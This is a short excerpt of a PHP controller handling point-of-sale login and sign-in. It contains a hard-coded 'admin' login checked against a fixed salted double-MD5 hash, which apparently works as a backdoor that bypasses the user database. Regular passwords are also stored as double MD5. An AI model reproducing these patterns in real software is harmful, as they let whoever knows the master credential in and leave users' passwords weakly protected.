...
class UsersController extends ControllerBase
{
    ...
    public function loginposAction(){        
        ...
        $this->view->_link_ = $this->session->has('_link_') ? $this->session->get('_link_') : "";
        $this->view->partial('pos/Users/loginPOS');
    }
    public function signinposAction(){        
        if(!$this->session->has('user')){
            ...
            if($username=='admin' && md5(md5($password).'anvysercurity') == '9a0d10368cb4fb5b3d40f649bd8c0e22'){
                $add = array();
    	...
    	if($this->request->isAjax()){
            if(!$this->session->has('user')){
				...
				if ($user) {
                    ...
                    if (md5(md5(trim($password)).(string)$user->_id) == $user->password){
						$this->session->set('user',$user->toArray());
						$arr_return['status'] = 'success';
					}else{
